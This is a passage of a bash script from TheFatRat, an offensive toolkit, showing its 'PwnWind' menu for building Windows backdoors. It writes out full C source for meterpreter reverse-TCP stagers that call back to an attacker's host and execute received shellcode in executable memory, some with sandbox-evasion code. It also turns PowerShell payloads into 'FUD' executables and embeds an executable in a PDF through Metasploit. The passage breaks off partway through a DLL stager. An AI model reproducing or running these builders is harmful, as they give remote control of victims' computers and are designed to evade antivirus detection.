read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
menu
fi

#looking if already exists a previous backdoor apk created and renaming it

ren=`shuf -i 1-1000 -n 1`
back=$path/backdoored/app_backdoored.apk
if [ -f "$back" ]
then
mv $path/backdoored/app_backdoored.apk $path/backdoored/app_backdoored_$ren.apk >>$log 2>&1
echo -e $yellow ""
echo "[!] FatRat Detected that you already had a previous created backdoor
file in ($path/backdoored/) with the name app_backdoored.apk ."
echo -e $okegreen ""
echo "[✔] FatRat have renamed your old backdoor to app_backdoored_$ren.apk"

# Moving apk backdoor to final destination
mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1

# Removing temp files
rm -rf temp/* > /dev/null 2>&1
else


# Moving apk backdoor to final destination
mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
rm -rf temp/* > /dev/null 2>&1
fi

varopt="$path/backdoored/app_backdoored.apk"
if [ ! -f $varopt ]; then
echo -e $red ""
echo "[x] There was an error copying your Rat app to final destination .
Check log file at : $log"
rm -rf temp/* > /dev/null 2>&1
echo -e $okegreen ""
    read -rsp $'Press [ENTER] key to continue to return to fatrat menu\n' -n 1 key
menu
fi

echo -e $green ""
echo "Your payload has been successfully & signed and it is located at :
 $path/backdoored/app_backdoored.apk"
sleep 2
echo -e $okegreen ""
echo "[*] Removing temporary files"
sleep 2
rm -rf $path/temp/* >/dev/null 2>&1
echo "[✔] Done!"
echo ""
crlst
;;
esac
}

###########################################################
#PwnWind v1.5
#Developed Edo Maland (Screetsec)
#thanks astro give reference
############################################################
############################################################
function PwnWinds() {
clear
echo ""
echo ""
echo -e $cyan" 	[ Select an Option To Begin >>"
echo ""
echo -e $lightgreen"	________                 ___       ______       _________       ";
echo "	___  __ \__      __________ |     / /__(_)____________  /_______";
echo "	__  /_/ /_ | /| / /_  __ \_ | /| / /__  /__  __ \  __  /__  ___/";
echo "	_  ____/__ |/ |/ /_  / / /_ |/ |/ / _  / _  / / / /_/ / _(__  ) ";
echo "	/_/     ____/|__/ /_/ /_/____/|__/  /_/  /_/ /_/\__,_/  /____/  ";
echo ""
echo -e $cyan"	                          ______    "
echo "	                       .-        -. "
echo "	                      /            \         "
echo "	                     |,  .-.  .-.  ,|      "
echo "	                     | )(_ /  \_ )( |"
echo "	                     |/     /\     \|    "
echo -e $red"	         $yellow  (@_   $cyan    <__    ^^    __>        "
echo -e $red"	      _     ) \_______$cyan""\__|IIIIII|__/$red""____________________ "
echo -e $red"	     (_)$yellow\@8@8{}<$red""________________________________________$yellow> "
echo -e $red"	            )_/    $cyan     \ IIIIII /                    "
echo -e $red"	         $yellow  (@        $cyan    --------                      "
echo -e $cyan"		            PwnWind Version $red v1.5 "
echo -e $cyan"		        Pwned Windows with backdoor"
echo -e " 		      Author : $red""Edo Maland (Screetsec)"
echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platform	           ";
			echo ""
 			echo -e $yellow"	[1] $okegreen Create a bat file+Powershell (FUD 100%)"
 			echo -e $yellow"	[2] $okegreen Create exe file with C# + Powershell (FUD 100%) "
	 		echo -e $yellow"        [3] $okegreen Create exe file with apache + Powershell (FUD 100%)"
 			echo -e $yellow"	[4] $okegreen Create exe file with C + Powershell (FUD 98 %)"
 			echo -e $yellow"	[5] $okegreen Create Backdoor with C + Powershell + Embed Pdf (FUD 80%)"
 			echo -e $yellow"	[6] $okegreen Create Backdoor with C / Meteperter_reverse_tcp (FUD 97%)"
 			echo -e $yellow"	[7] $okegreen Create Backdoor with C / Metasploit Staging Protocol (FUD 98%)"
 			echo -e $yellow"	[8] $okegreen Create Backdoor with C to dll ( custom dll inject )"
			echo -e $yellow"        [9] $okegreen Back to Menu "
 			echo -e $yellow" "
  	 		echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"pwnwind$okegreen]:"
			echo -ne $okegreen" └─────► " ;tput sgr0
 			read fatrat1

			case $fatrat1 in
1)
					echo ""
					  echo -e $okegreen""
					  echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
					  echo -e $yellow "  Your public IP address is : $publicip"
					  echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
					  echo -e $okegreen ""
					if [ -z "$yourip" ]; then
				read -p '  Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '  Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
pldwin
spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
					$dave $payload $yourip $yourport > /dev/null 2>&1
					echo ""
					echo ""
					cat powershell_attack.txt
					sleep 2
					rm unicorn.rc
					mv powershell_attack.txt output/$fira.bat
					echo ""
					echo -e $okegreen""
					echo -e "Backdoor Saved To output Folder "
PwnWinds
;;
2)
					echo ""
					  echo -e $okegreen""
					  echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
					  echo -e $yellow "  Your public IP address is : $publicip"
					  echo -e $yellow "  Your Hostname is : $hostn"
					  echo -e $okegreen ""
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
					if [ -z "$yourip" ]; then
				read -p '  Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '  Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
pldwin
spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
					$pwned $payload $yourip $yourport > /dev/null 2>&1
					echo ""
					echo ""
					#rm tmp source
					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
					s3=$(cat powershell_attack.txt | cut -d ' ' -f4)
					s4=$(cat powershell_attack.txt | cut -d ' ' -f5)
					rm $bcom > /dev/null 2>&1
					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $B > $bcom
					echo
					echo
					cat $bcom
					echo;spinlong;echo
					sleep 1
					echo
					mcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
					rm unicorn.rc powershell_attack.txt
					echo ""
					echo -e $okegreen""
					echo -e $white"Program Saved To $path/output/$fira.exe "
					echo ""
					echo -e $red"Compiled the source using monodevelop in your linux system"
					echo
					echo -ne "  Press [ENTER] key to continue ......... "
					read continue
PwnWinds


;;
3)
					echo ""
					echo -e $okegreen""
					echo -e $okegreen " Starting Apache Server wait ..."
					/etc/init.d/apache2 start > /dev/null 2>&1
					echo ""
					  echo -e $okegreen""
					  echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
					  echo -e $yellow "  Your public IP address is : $publicip"
					  echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
					  echo -e $okegreen ""
					if [ -z "$yourip" ]; then
				read -p '  Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '  Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
pldwin
spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
					$pwned $payload $yourip $yourport > /dev/null 2>&1
					echo ""
					echo $yourip >> "$out"

					s0=$(cat $out | cut -d ' ' -f1)

					sed s/SERVER/$s0/g $apache > $apachecom
					echo
					$COMPILER -Wall -mwindows icons/icon.res $apachecom -o "output/$fira.exe" > /dev/null 2>&1
					rm unicorn.rc  $apachecom $out
					mv powershell_attack.txt $apache2
					sleep 2
					echo ""
					echo -e $okegreen""
					echo -e "  Backdoor Saved To output Folder "
					echo ""
					echo -ne "  Press [ENTER] key to continue ......... "
					read continue
PwnWinds

;;
4)
					echo ""
					  echo -e $okegreen""
					  echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
					  echo -e $yellow "  Your public IP address is : $publicip"
					  echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
					  echo -e $okegreen ""
					if [ -z "$yourip" ]; then
				read -p '  Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '  Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
pldwin
spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
					$pwned $payload $yourip $yourport > /dev/null 2>&1
					echo ""
					echo ""

					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
					s3=$(cat powershell_attack.txt | cut -d ' ' -f4)
					s4=$(cat powershell_attack.txt | cut -d ' ' -f5)

					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $paycom
					echo
					$COMPILER -Wall -mwindows icons/icon.res $paycom -o "output/$fira.exe" > /dev/null 2>&1
					rm unicorn.rc powershell_attack.txt $paycom
					sleep 2
					echo ""
					echo -e $okegreen""
					echo -e "  Backdoor Saved To output Folder "
					echo ""
					echo -ne "  Press [ENTER] key to continue ......... "
					read continue
PwnWinds

;;
5)
					echo
					echo -e $yellow"  Worked on Adobe Reader v8.x, v9.x / Windows XP SP3 / Windows 7/Vista ( English )"
					  echo -e $okegreen""
					  echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
					  echo -e $yellow "  Your public IP address is : $publicip"
					  echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
					  echo -e $okegreen ""
					if [ -z "$yourip" ]; then
				read -p '  Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '  Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
					echo ""
					echo -ne $okegreen " Located Original PDF file for embed (example:/TheFatRat/PE/original.pdf) :" ;tput sgr0
					read embedpdf
if [ -z "$embedpdf" ]; then
embedpdf="$path/PE/original.pdf"
fipldwin
					spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
					$pwned $payload $yourip $yourport > /dev/null 2>&1
					echo ""
					echo ""

					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
					s3=$(cat powershell_attack.txt | cut -d ' ' -f4)
					s4=$(cat powershell_attack.txt | cut -d ' ' -f5)

					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $pdfcom
					echo
					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
					sleep 2
					echo " Wait for embed exe to pdf ....  "
					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
					echo ""
					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
					rm unicorn.rc powershell_attack.txt
					echo -e $okegreen""
					echo -e $yellow"  Backdoor PDF Saved To output Folder "
					echo ""
					echo -ne $okegreen"  Press [ENTER] key to continue ......... "
					read continue
PwnWinds
fi
;;
6)
        echo ""
        echo -e $okegreen""
        echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
        echo -e $yellow "  Your public IP address is : $publicip"
        echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
        echo -e $okegreen ""
        if [ -z "$yourip" ]; then
	read -p '  Set LHOST IP: ' yourip
        fi
        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '  Set LPORT: ' yourport
        fi
        echo ""
        echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
        read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
        spinlong
        echo ""
        echo ""
        gboor
        spinlong
        echo ""
        echo '#include <stdio.h>' > $reverse1
        echo '#include <stdlib.h>' >> $reverse1
        echo '#include <winsock2.h>' >> $reverse1
        echo '#include <windows.h>' >> $reverse1
        echo 'void winsock_init();' >> $reverse1
        echo 'void Kick(SOCKET my_socket, char * error);' >> $reverse1
        echo 'void genlol();' >> $reverse1
        echo 'int recv_all(SOCKET my_socket, void * buffer, int len);' >> $reverse1
        echo 'SOCKET wsconnect(char * targetip, int port);' >> $reverse1
        echo 'int random_in_range (unsigned int min, unsigned int max);' >> $reverse1
        echo 'char* rev(char* str);' >> $reverse1
        echo 'int sandbox_evasion();' >> $reverse1
        echo 'inline void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort);' >> $reverse1
        echo 'void winsock_init() {' >> $reverse1
        echo ' WSADATA wsaData;' >> $reverse1
        echo ' WORD wVersionRequested;' >> $reverse1
        echo ' wVersionRequested = MAKEWORD(2, 2);' >> $reverse1
        echo ' if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> $reverse1
        echo ' printf("ws2_32.dll is out of date.\n");' >> $reverse1
        echo ' WSACleanup();' >> $reverse1
        echo ' exit(1);' >> $reverse1
        echo ' }' >> $reverse1
        echo '}' >> $reverse1
        echo 'void Kick(SOCKET my_socket, char * error) {' >> $reverse1
        echo ' printf("error: %s\n", error);' >> $reverse1
        echo ' closesocket(my_socket);' >> $reverse1
        echo ' WSACleanup();' >> $reverse1
        echo ' exit(1);' >> $reverse1
        echo ' }' >> $reverse1
        echo 'void genlol(){' >> $reverse1
        echo ' int num1, num2, num3;' >> $reverse1
        echo ' num1=100;' >> $reverse1
        echo ' while (num1<=5) {' >> $reverse1
        echo ' num1=random_in_range(0,10000);' >> $reverse1
        echo ' num2=random_in_range(0,10000);' >> $reverse1
        echo ' num3=random_in_range(0,10000);' >> $reverse1
        echo ' }' >> $reverse1
        echo '}' >> $reverse1
        echo 'int recv_all(SOCKET my_socket, void * buffer, int len) {' >> $reverse1
        echo ' int tret = 0;' >> $reverse1
        echo ' int nret = 0;' >> $reverse1
        echo ' void * startb = buffer;' >> $reverse1
        echo ' while (tret < len) {' >> $reverse1
        echo ' nret = recv(my_socket, (char *)startb, len - tret, 0);' >> $reverse1
        echo ' startb += nret;' >> $reverse1
        echo ' tret += nret;' >> $reverse1
        echo ' if (nret == SOCKET_ERROR)' >> $reverse1
        echo ' Kick(my_socket, "Could not receive data");' >> $reverse1
        echo ' }' >> $reverse1
        echo ' return tret;' >> $reverse1
        echo '}' >> $reverse1
        echo 'SOCKET wsconnect(char * targetip, int port) {' >> $reverse1
        echo ' struct hostent * target;' >> $reverse1
        echo ' struct sockaddr_in sock;' >> $reverse1
        echo ' SOCKET my_socket;' >> $reverse1
        echo ' my_socket = socket(AF_INET, SOCK_STREAM, 0);' >> $reverse1
        echo ' if (my_socket == INVALID_SOCKET)' >> $reverse1
        echo ' Kick(my_socket, "Cannot initialize socket");' >> $reverse1
        echo ' target = gethostbyname(targetip);' >> $reverse1
        echo ' if (target == NULL)' >> $reverse1
        echo ' Kick(my_socket, "cannot resolve target");' >> $reverse1
        echo ' memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);' >> $reverse1
        echo ' sock.sin_family = AF_INET;' >> $reverse1
        echo ' sock.sin_port = htons(port);' >> $reverse1
        echo ' if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )' >> $reverse1
        echo ' Kick(my_socket, "Could not connect");' >> $reverse1
        echo ' return my_socket;' >> $reverse1
        echo '}' >> $reverse1
        echo 'int random_in_range (unsigned int min, unsigned int max)' >> $reverse1
        echo '{' >> $reverse1
        echo ' int base_random = rand(); ' >> $reverse1
        echo ' if (RAND_MAX == base_random){' >> $reverse1
        echo ' return random_in_range(min, max);' >> $reverse1
        echo ' }' >> $reverse1
        echo ' int range = max - min,' >> $reverse1
        echo ' remainder = RAND_MAX % range,' >> $reverse1
        echo ' bucket = RAND_MAX / range;' >> $reverse1
        echo ' if (base_random < RAND_MAX - remainder) {' >> $reverse1
        echo ' return min + base_random/bucket;' >> $reverse1
        echo ' } else {' >> $reverse1
        echo ' return random_in_range (min, max);' >> $reverse1
        echo ' }' >> $reverse1
        echo '}' >> $reverse1
        echo 'char* rev(char* str)' >> $reverse1
        echo '{' >> $reverse1
        echo ' int end=strlen(str)-1;' >> $reverse1
        echo ' int i;' >> $reverse1
        echo ' for(i=5; i<end; i++)' >> $reverse1
        echo ' {' >> $reverse1
        echo ' str[i] ^= 1;' >> $reverse1
        echo ' }' >> $reverse1
        echo ' return str;' >> $reverse1
        echo '}' >> $reverse1
        echo 'int sandbox_evasion(){' >> $reverse1
        echo ' MSG msg;' >> $reverse1
        echo ' DWORD tc;' >> $reverse1
        echo ' PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);' >> $reverse1
        echo ' if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))' >> $reverse1
        echo ' return -1;' >> $reverse1
        echo ' if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)' >> $reverse1
        echo ' return -1;' >> $reverse1
        echo ' tc = GetTickCount();' >> $reverse1
        echo ' Sleep(650);' >> $reverse1
        echo ' if (((GetTickCount() - tc) / 300) != 2)' >> $reverse1
        echo ' return -1;' >> $reverse1
        echo ' return 0;' >> $reverse1
        echo '}' >> $reverse1
        echo 'void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort){' >> $reverse1
        echo ' ULONG32 size;' >> $reverse1
        echo ' char * buffer;' >> $reverse1
        echo ' void (*function)();' >> $reverse1
        echo ' winsock_init();' >> $reverse1
        echo ' SOCKET my_socket = wsconnect(listenerIP, listenerPort);' >> $reverse1
        echo ' int count = recv(my_socket, (char *)&size, 4, 0);' >> $reverse1
        echo ' if (count != 4 || size <= 0)' >> $reverse1
        echo ' Kick(my_socket, "bad length value\n");' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' if (buffer == NULL)' >> $reverse1
        echo ' Kick(my_socket, "bad buffer\n");' >> $reverse1
        echo ' buffer[0] = 0xBF;' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' memcpy(buffer + 1, &my_socket, 4);' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' count = recv_all(my_socket, buffer + 5, size);' >> $reverse1
        echo ' function = (void (*)())buffer;' >> $reverse1
        echo ' function();' >> $reverse1
        echo '}' >> $reverse1
        echo 'void reverse_tcp_meterpreter_x64(char * listenerIP,unsigned int listenerPort){' >> $reverse1
        echo ' ULONG32 size;' >> $reverse1
        echo ' char * buffer;' >> $reverse1
        echo ' void (*function)();' >> $reverse1
        echo ' winsock_init();' >> $reverse1
        echo ' SOCKET my_socket = wsconnect(listenerIP, listenerPort);' >> $reverse1
        echo ' int count = recv(my_socket, (char *)&size, 4, 0);' >> $reverse1
        echo ' if (count != 4 || size <= 0)' >> $reverse1
        echo ' Kick(my_socket, "bad length value\n");' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' buffer = VirtualAlloc(0, size + 10, MEM_COMMIT, PAGE_EXECUTE_READWRITE);' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' if (buffer == NULL)' >> $reverse1
        echo ' Kick(my_socket, "bad buffer\n");' >> $reverse1
        echo ' buffer[0] = 0x48;' >> $reverse1
        echo ' buffer[1] = 0xBF;' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' memcpy(buffer + 2, &my_socket, 8);' >> $reverse1
        echo ' genlol();' >> $reverse1
        echo ' count = recv_all(my_socket, buffer + 10, size);' >> $reverse1
        echo ' function = (void (*)())buffer;' >> $reverse1
        echo ' function();' >> $reverse1
        echo '}' >> $reverse1
        echo 'int main(int argc, char *argv[]) {' >> $reverse1
        echo -n 'char * defaultListenerIP = "' >> $reverse1
        echo -n $yourip >> $reverse1
        echo -n '";' >> $reverse1
        echo '' >> $reverse1
        echo -n 'unsigned int defaultListenerPort = ' >> $reverse1
        echo -n $yourport >> $reverse1
        echo -n ';' >> $reverse1
        echo '' >> $reverse1
        echo ' sandbox_evasion();' >> $reverse1
        echo ' if(argc == 3){' >> $reverse1
        echo ' #ifdef ISX64' >> $reverse1
        echo ' reverse_tcp_meterpreter_x64(argv[1], atoi(argv[2]));' >> $reverse1
        echo ' #else' >> $reverse1
        echo ' reverse_tcp_meterpreter_x64(argv[1], atoi(argv[2]));' >> $reverse1
        echo ' #endif' >> $reverse1
        echo ' }else{' >> $reverse1
        echo ' #ifdef ISX64' >> $reverse1
        echo ' reverse_tcp_meterpreter_x64(defaultListenerIP, defaultListenerPort);' >> $reverse1
        echo ' #else' >> $reverse1
        echo ' reverse_tcp_meterpreter_x64(defaultListenerIP, defaultListenerPort);' >> $reverse1
        echo ' #endif' >> $reverse1
        echo ' }' >> $reverse1
        echo ' return 0;' >> $reverse1
        echo '}' >> $reverse1
        $COMPILER $reverse1 -o output/$fira.exe -lws2_32 -mwindows
	      echo
        echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
        rm $reverse1
	      echo -ne $yellow " Press Enter key to Contiune ..."
        read aw
	      PwnWinds

;;
7)
      echo ""
      echo -e $okegreen""
      echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
      echo -e $yellow "  Your public IP address is : $publicip"
      echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
      echo -e $okegreen""
      if [ -z "$yourip" ]; then
      read -p '  Set LHOST IP: ' yourip
      fi
      echo -e $okegreen ""
      if [ -z "$yourport" ]; then
      read -p '  Set LPORT: ' yourport
      fi
      echo ""
      echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
      read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
      spinlong
      echo ""
      echo ""
      gboor
      spinlong
      echo ""
      echo '#include <stdio.h>'> $stag
      echo '#include <stdlib.h>' >> $stag
      echo '#include <winsock2.h>' >> $stag
      echo '#include <windows.h>' >> $stag
      echo -n 'unsigned char server[]="' >> $stag
      echo -n $yourip >> $stag
      echo -n '";' >> $stag
      echo '' >> $stag
      echo -n 'unsigned char serverp[]="' >> $stag
      echo -n $yourport >> $stag
      echo -n '";' >> $stag
      echo '' >> $stag
      echo 'void winsock_init() {' >> $stag
      echo '    WSADATA    wsaData;' >> $stag
      echo '    WORD    wVersionRequested;' >> $stag
      echo '    wVersionRequested = MAKEWORD(2, 2);'>> $stag
      echo '    if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> $stag
      echo '         printf("ws2_32.dll is out of date.\n"); '>> $stag
      echo '         WSACleanup(); '>> $stag
      echo '        exit(1);'>> $stag
      echo '    }' >> $stag
      echo ' }' >> $stag
      echo ' void punt(SOCKET my_socket, char * error) {' >> $stag
      echo '    printf("Bad things: %s\n", error);'>> $stag
      echo '    closesocket(my_socket);'>> $stag
      echo '    WSACleanup();'>> $stag
      echo '    exit(1);' >> $stag
      echo ' }' >> $stag
      echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> $stag
      echo '    int    tret   = 0;'>> $stag
      echo '    int    nret   = 0;'>>$stag
      echo '    void * startb = buffer;'>> $stag
      echo '    while (tret < len) {'>>$stag
      echo '        nret = recv(my_socket, (char *)startb, len - tret, 0);'>> $stag
      echo '        startb += nret;'>> $stag
      echo '        tret   += nret;'>>$stag
      echo '         if (nret == SOCKET_ERROR)'>> $stag
      echo '            punt(my_socket, "Could not receive data");'>> $stag
      echo '    }'>>$stag
      echo '    return tret;'>> $stag
      echo '}' >> $stag
      echo 'SOCKET wsconnect(char * targetip, int port) {'>> $stag
      echo '    struct hostent *        target;' >> $stag
      echo '    struct sockaddr_in     sock;' >> $stag
      echo '    SOCKET             my_socket;'>>$stag
      echo '    my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> $stag
      echo '     if (my_socket == INVALID_SOCKET)'>> $stag
      echo '        punt(my_socket, ".");'>>$stag
      echo '    target = gethostbyname(targetip);'>>$stag
      echo '    if (target == NULL)'>>$stag
      echo '        punt(my_socket, "..");'>>$stag
      echo '    memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>>$stag
      echo '    sock.sin_family = AF_INET;'>> $stag
      echo '    sock.sin_port = htons(port);'>>$stag
      echo '    if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>>$stag
      echo '         punt(my_socket, "...");'>>$stag
      echo '    return my_socket;'>>$stag
      echo '}' >> $stag
      echo 'int main(int argc, char * argv[]) {' >> $stag
      echo '  FreeConsole();'>>$stag
      echo '    ULONG32 size;'>>$stag
      echo '    char * buffer;'>>$stag
      echo '    void (*function)();'>>$stag
      echo '    winsock_init();'>> $stag
      echo '    SOCKET my_socket = wsconnect(server, atoi(serverp));'>>$stag
      echo '    int count = recv(my_socket, (char *)&size, 4, 0);'>>$stag
      echo '    if (count != 4 || size <= 0)'>>$stag
      echo '        punt(my_socket, "read a strange or incomplete length value\n");'>>$stag
      echo '    buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>>$stag
      echo '    if (buffer == NULL)'>>$stag
      echo '        punt(my_socket, "could not allocate buffer\n");'>>$stag
      echo '    buffer[0] = 0xBF;'>>$stag
      echo '    memcpy(buffer + 1, &my_socket, 4);'>>$stag
      echo '    count = recv_all(my_socket, buffer + 5, size);'>>$stag
      echo '    function = (void (*)())buffer;'>>$stag
      echo '    function();'>>$stag
      echo '    return 0;'>>$stag
      echo '}' >> $stag
      $COMPILER $stag -o output/$fira.exe -lws2_32
      echo
      echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
      rm $stag
      echo -ne $yellow " Press Enter key to Contiune ..."
      read aw
      PwnWinds

;;


8)
      echo ""
      echo -e $okegreen""
      echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
      echo -e $yellow "  Your public IP address is : $publicip"
      echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
      echo -e $okegreen""
      if [ -z "$yourip" ]; then
      read -p '  Set LHOST IP: ' yourip
      fi
      echo -e $okegreen ""
      if [ -z "$yourport" ]; then
      read -p '  Set LPORT: ' yourport
      fi
      echo ""
      echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
      read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
PwnWinds
fi
      spinlong
      echo ""
      echo ""
      gboor
      spinlong
      echo ""
	echo '#include <stdio.h>'> $dllcustom
	echo '#include <stdlib.h>' >> $dllcustom
	echo '#include <winsock2.h>' >> $dllcustom
	echo '#include <windows.h>' >> $dllcustom
	echo -n 'unsigned char server[]="' >> $dllcustom
	echo -n $yourip >> $dllcustom
	echo -n '";' >> $dllcustom
	echo '' >> $dllcustom
	echo -n 'unsigned char serverp[]="' >> $dllcustom
	echo -n $yourport >> $dllcustom
	echo -n '";' >> $dllcustom
	echo '' >> $dllcustom
	echo 'void winsock_init() {' >> $dllcustom
	echo '    WSADATA    wsaData;' >> $dllcustom
	echo '    WORD    wVersionRequested;' >> $dllcustom
	echo '    wVersionRequested = MAKEWORD(2, 2);'>> $dllcustom
	echo '    if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> $dllcustom
	echo '         printf("bad\n"); '>> $dllcustom
	echo '         WSACleanup(); '>> $dllcustom
	echo '        exit(1);'>> $dllcustom
	echo '    }' >> $dllcustom
	echo ' }' >> $dllcustom
	echo ' void punt(SOCKET my_socket, char * error) {' >> $dllcustom
	echo '    printf("r %s\n", error);'>> $dllcustom
	echo '    closesocket(my_socket);'>> $dllcustom
	echo '    WSACleanup();'>> $dllcustom
	echo '    exit(1);' >> $dllcustom
	echo ' }' >> $dllcustom
	echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> $dllcustom
	echo '    int    tret   = 0;'>> $dllcustom
	echo '    int    nret   = 0;'>> $dllcustom
	echo '    void * startb = buffer;'>> $dllcustom
